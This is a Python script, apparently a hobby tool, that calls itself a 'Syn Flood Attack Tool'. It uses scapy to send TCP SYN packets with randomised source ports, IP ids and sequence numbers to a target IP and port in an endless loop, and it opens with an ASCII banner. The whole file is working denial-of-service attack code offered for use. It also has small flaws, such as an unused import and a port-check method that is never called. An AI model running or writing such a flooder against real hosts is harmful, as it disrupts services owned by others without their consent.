from tabnanny import verbose
from scapy.all import *
import sys
import optparse
import socket
import random
import time

class SynFlooder:
    def __init__(self) -> None:
        self.target = self.get_params()[0]
        self.port = self.get_params()[1]
        banner = """


                ____.                             __      __                      
                |    |____    __________   ____   /  \    /  \____   ____    ____  
                |    \__  \  /  ___/  _ \ /    \  \   \/\/   /  _ \ /    \  / ___\ 
            /\__|    |/ __ \_\___ (  <_> )   |  \  \        (  <_> )   |  \/ /_/  >
            \________(____  /____  >____/|___|  /   \__/\  / \____/|___|  /\___  / 
                        \/     \/           \/         \/             \//_____/  



                        Syn Flood Attack Tool V1.0

        """
        print(banner)

    def get_params(self):
        parser = optparse.OptionParser('Usage: ./%s -t target -p port' % sys.argv[0])
        parser.add_option('-t', '--target', dest='target', type='string', help='Specify IP address of target')
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify target port')
        options, args = parser.parse_args()
        if options.target is None or options.port is None:
            print(parser.usage)
            sys.exit()
        return options.target, options.port

    
    def check_port_status(self):
        c_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c_socket.settimeout(2)
        try:
            c_socket.connect((self.target, self.port))
        except:
            print('The open is closed on the target: %s' % self.target)
            sys.exit()
        finally:
            c_socket.close()
    
    def run(self):
        i = 0
        print('Sending packet: ', end='')
        while True:
            try:
                ip_id = random.randint(1,65535)
                sport = random.randint(1,65535)
                seq = random.randint(1,65535)
                packet = IP(dst=self.target, id=ip_id)/TCP(dport=self.port, sport=sport, flags="S", seq=seq)
                send(packet, verbose=False)
                i += 1
                sys.stdout.write('\r\t\t%d'% i)
                sys.stdout.flush()
                time.sleep(1)
               
                
            except KeyboardInterrupt:
                print("Exiting the program now")
                sys.exit()
    
if __name__ == '__main__':
    flooder = SynFlooder()
    flooder.run()